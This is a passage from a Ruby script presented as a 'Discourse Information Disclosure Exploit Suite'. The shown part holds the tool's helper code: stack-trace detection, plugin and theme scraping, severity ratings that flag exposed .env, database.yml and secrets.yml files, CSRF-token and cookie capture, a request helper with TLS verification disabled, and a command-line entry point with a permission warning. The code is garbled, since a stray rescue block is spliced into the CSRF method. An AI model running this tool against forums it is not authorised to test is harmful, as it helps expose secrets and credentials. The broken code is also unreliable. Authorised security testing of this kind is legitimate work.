      end
    end
    
    error_data.uniq
  end
  
  def check_stack_trace(body)
    # Check for stack trace indicators
    stack_trace_patterns = [
      /\s+at\s+.+\(.+:\d+:\d+\)/,
      /\s+from\s+.+:\d+:in\s+/,
      /\/.+\.rb:\d+:in\s+`[^`]+'/,
      /app\/.*\.rb:\d+/,
      /lib\/.*\.rb:\d+/,
      /vendor\/.*\.rb:\d+/,
      /Traceback.*most recent call last/i,
      /Stack trace:/i
    ]
    
    stack_trace_patterns.any? { |pattern| body.match(pattern) }
  end
  
  def extract_plugin_data(body)
    plugin_data = []
    
    begin
      if body.include?('{') && body.include?('}')
        data = JSON.parse(body)
        
        if data['plugins'] && data['plugins'].is_a?(Array)
          data['plugins'].each do |plugin|
            if plugin['name']
              plugin_data << plugin['name']
            end
          end
        end
      end
    rescue JSON::ParserError
      # Extract plugin names from HTML
      plugin_pattern = /plugin["']?\s*[:=]\s*["']([^"']+)["']/i
      body.scan(plugin_pattern) do |match|
        plugin_data << match[0]
      end
    end
    
    plugin_data.uniq
  end
  
  def extract_theme_data(body)
    theme_data = []
    
    begin
      if body.include?('{') && body.include?('}')
        data = JSON.parse(body)
        
        if data['themes'] && data['themes'].is_a?(Array)
          data['themes'].each do |theme|
            if theme['name']
              theme_data << theme['name']
            end
          end
        end
      end
    rescue JSON::ParserError
      # Extract theme names from HTML/CSS
      theme_pattern = /theme["']?\s*[:=]\s*["']([^"']+)["']/i
      body.scan(theme_pattern) do |match|
        theme_data << match[0]
      end
    end
    
    theme_data.uniq
  end
  
  def determine_config_severity(sensitive_data)
    critical_indicators = ['password', 'secret', 'key', 'token']
    
    if sensitive_data.any? { |data| critical_indicators.any? { |indicator| data.downcase.include?(indicator) } }
      'Critical'
    else
      'Medium'
    end
  end
  
  def determine_file_severity(filename)
    critical_files = ['.env', 'database.yml', 'secrets.yml']
    high_files = ['Gemfile', 'config.ru', 'package.json']
    
    if critical_files.any? { |file| filename.include?(file) }
      'Critical'
    elsif high_files.any? { |file| filename.include?(file) }
      'High'
    else
      'Low'
    end
  end
  
  def extract_csrf_token
    begin
      response = make_request(URI("#{@target_url}/"), 'GET')
      if response && response.body
        # Extract CSRF token from meta tag
        if match = response.body.match(/name="csrf-token"\s+content="([^"]+)"/)
          @csrf_token = match[1]
        end
        
        # Extract session cookies
        if response['Set-Cookie']
          @session[:cookies] = response['Set-Cookie']
        end
      end
    rescue => e
    puts "\n[!] Testing failed: #{e.message}"
  end
end
      puts "[!] Failed to extract CSRF token: #{e.message}"
    end
  end
  
  def make_request(uri, method, body = nil, headers = {})
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = uri.scheme == 'https'
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl?
    http.read_timeout = @timeout
    http.open_timeout = @timeout
    
    # Set proxy if provided
    if @proxy
      proxy_uri = URI(@proxy)
      http = Net::HTTP.new(uri.host, uri.port, proxy_uri.host, proxy_uri.port)
    end
    
    # Default headers
    default_headers = {
      'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language' => 'en-US,en;q=0.5',
      'Accept-Encoding' => 'gzip, deflate',
      'Connection' => 'keep-alive'
    }
    
    # Add session cookies
    if @session[:cookies]
      default_headers['Cookie'] = @session[:cookies]
    end
    
    headers = default_headers.merge(headers)
    
    request = case method.upcase
    when 'GET'
      Net::HTTP::Get.new(uri.request_uri, headers)
    when 'POST'
      req = Net::HTTP::Post.new(uri.request_uri, headers)
      req.body = body if body
      req
    when 'PUT'
      req = Net::HTTP::Put.new(uri.request_uri, headers)
      req.body = body if body
      req
    when 'DELETE'
      Net::HTTP::Delete.new(uri.request_uri, headers)
    end
    
    begin
      response = http.request(request)
      return response
    rescue => e
      puts "[!] Request failed: #{e.message}" if @verbose
      return nil
    end
  end
  
  def make_post_request(url, form_data)
    uri = URI(url)
    body = URI.encode_www_form(form_data)
    
    make_request(uri, 'POST', body, {
      'Content-Type' => 'application/x-www-form-urlencoded',
      'X-CSRF-Token' => @csrf_token || '',
      'X-Requested-With' => 'XMLHttpRequest'
    })
  end
  
  def add_vulnerability(vuln_data)
    @results[:vulnerabilities] << vuln_data
    @results[:vulnerable] = true
    @results[:summary][:successful_tests] += 1
    
    case vuln_data[:severity]
    when 'Critical'
      @results[:summary][:critical_vulns] += 1
    when 'High'
      @results[:summary][:high_vulns] += 1
    when 'Medium'
      @results[:summary][:medium_vulns] += 1
    when 'Low'
      @results[:summary][:low_vulns] += 1
    end
    
    puts "  ‚úì #{vuln_data[:severity]} info disclosure: #{vuln_data[:test_type]}"
  end
  
  def print_results
    puts "\n" + "=" * 60
    puts "DISCOURSE INFORMATION DISCLOSURE TEST RESULTS"
    puts "=" * 60
    puts "Target: #{@target_url}"
    puts "Vulnerable: #{@results[:vulnerable] ? 'YES' : 'NO'}"
    puts "Total Tests: #{@results[:summary][:total_tests]}"
    puts "Successful Tests: #{@results[:summary][:successful_tests]}"
    puts "Critical Vulnerabilities: #{@results[:summary][:critical_vulns]}"
    puts "High Vulnerabilities: #{@results[:summary][:high_vulns]}"
    puts "Medium Vulnerabilities: #{@results[:summary][:medium_vulns]}"
    puts "Low Vulnerabilities: #{@results[:summary][:low_vulns]}"
    
    if @results[:vulnerabilities].any?
      puts "\nVulnerabilities Found:"
      @results[:vulnerabilities].each_with_index do |vuln, index|
        puts "  #{index + 1}. #{vuln[:severity]} - #{vuln[:endpoint]} (#{vuln[:test_type]})"
        puts "     Method: #{vuln[:method]}"
        puts "     Evidence: #{vuln[:evidence].join(', ')}" if vuln[:evidence].any?
      end
    end
  end
  
  def save_results
    filename = 'discourse_info_disclosure_results.json'
    File.write(filename, JSON.pretty_generate(@results))
    puts "\n[*] Results saved to #{filename}"
  end
end

# Main execution
if __FILE__ == $0
  require 'optparse'
  
  options = {}
  OptionParser.new do |opts|
    opts.banner = "Discourse Information Disclosure Exploit Suite\n\n"
    opts.banner += "Usage: ruby discourse_info_disclosure.rb [options] TARGET_URL\n\n"
    
    opts.on('--proxy PROXY', 'Proxy URL (e.g., http://127.0.0.1:8080)') do |proxy|
      options[:proxy] = proxy
    end
    
    opts.on('--timeout TIMEOUT', Integer, 'Request timeout (default: 10)') do |timeout|
      options[:timeout] = timeout
    end
    
    opts.on('-h', '--help', 'Show this help') do
      puts opts
      puts "\nExample:"
      puts "  ruby discourse_info_disclosure.rb https://discourse.example.com"
      puts "\nWARNING: Use only on systems you own or have explicit permission to test!"
      exit
    end
  end.parse!
  
  if ARGV.empty?
    puts "Error: Target URL required"
    puts "Use --help for usage information"
    exit 1
  end
  
  target_url = ARGV[0]
  
  begin
    exploit = DiscourseInfoDisclosure.new(target_url, options)
    results = exploit.run_all_tests
    
    if results[:vulnerable]
      puts "\nüö® CRITICAL: Information disclosure vulnerabilities found!"
      puts "   Sensitive information may be exposed!"
    else
      puts "\n‚úÖ No information disclosure vulnerabilities detected"
    end
    
  rescue Interrupt
    puts "\n[!] Testing interrupted by user"
  rescue => e